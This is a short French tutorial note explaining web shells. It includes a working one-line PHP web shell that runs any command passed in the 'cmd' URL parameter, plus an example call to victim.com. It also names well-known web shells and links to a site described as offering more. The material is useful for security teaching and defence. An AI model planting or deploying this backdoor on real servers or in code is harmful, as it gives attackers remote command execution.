## 🔹 Qu’est-ce qu’un Web Shell ?

- Script (PHP, ASP, JSP, CGI, etc.) déposé sur un serveur web compromis.
- Permet d’exécuter des commandes via le serveur lui-même.
- Souvent caché dans une application vulnérable (**upload non restreint, inclusion de fichier, injection de commandes**, etc.).
- Très populaire car **difficile à détecter** et puissant.
---

## 🔹 Exemple de Web Shell PHP
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
- Sauvegardé en `shell.php` et uploadé sur le serveur.
- Accessible via :
```
http://victim.com/uploads/shell.php?cmd=whoami
```
## 🔹 Exemples de Web Shells connus
- **p0wny-shell** → minimaliste, exécution de commandes (interface type terminal).
- **b374k shell** → riche en fonctionnalités (explorateur de fichiers + exécution de commandes).
- **c99 shell** → très complet et robuste, utilisé depuis longtemps.

🔗 D’autres exemples disponibles ici :  
[https://www.r57shell.net/index.php](https://www.r57shell.net/index.php)